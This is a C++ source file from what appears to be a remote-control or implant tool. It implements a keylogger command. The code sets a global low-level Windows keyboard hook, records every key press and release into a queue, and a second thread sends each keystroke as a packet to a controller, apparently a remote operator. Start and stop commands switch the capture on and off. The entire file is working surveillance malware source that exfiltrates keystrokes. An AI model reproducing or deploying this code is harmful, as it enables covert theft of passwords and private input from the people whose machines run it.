#include "commands.h"
#include "datatypes.h"
#include "controller.h"
#include "log.h"
#include "util.h"
#include "simplepacket.h"
#include <windows.h>
#include <rigtorp/SPSCQueue.h>

rigtorp::SPSCQueue<KeyEvent> keyEventQueue(0x1000);
bool enabled = false;
std::thread keylogThread;
std::thread keylogFlushThread;

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*) lParam;
    KeyEvent event;
    event.keyDown = wParam == WM_KEYDOWN;
    event.vkCode = kbd->vkCode;
    bool result = keyEventQueue.try_push(event);
    return CallNextHookEx(NULL, code, wParam, lParam);
}

void keylogThreadProc(Controller* ctrl) {
    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (hook == NULL) {
        ctrl->err_println(getWin32ErrorString());
        return;
    }
    MSG msg = {};
    while (enabled && GetMessage(&msg, NULL, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hook);
}

void keylogFlushThreadProc(Controller* ctrl) {
    while (enabled) {
        if (!keyEventQueue.empty()) {
            auto event = *keyEventQueue.front();
            keyEventQueue.pop();
            SimplePacket<KeyEvent> keyEventPacket(6, event);
            ctrl->send_packet(keyEventPacket);
        }
    }
}

int KeylogCommand::execute(Controller& ctrl, KeylogCommandEnum command) {
    switch (command) {
        case KeylogCommandEnum::start: {
            enabled = true;
            keylogThread = std::thread(keylogThreadProc, &ctrl);
            keylogFlushThread = std::thread(keylogFlushThreadProc, &ctrl);
            DEBUGLOG("Keylogging...\n");
            return 0;
        }
        case KeylogCommandEnum::stop: {
            enabled = false;
            if (!PostThreadMessage(GetThreadId(keylogThread.native_handle()), 0, 0, 0)) {
                ctrl.err_println(getWin32ErrorString());
                return 1;
            }
            keylogThread.join();
            keylogFlushThread.join();
            DEBUGLOG("Stopped keylogging\n");
            return 0;
        }
    }
    return -1;
}
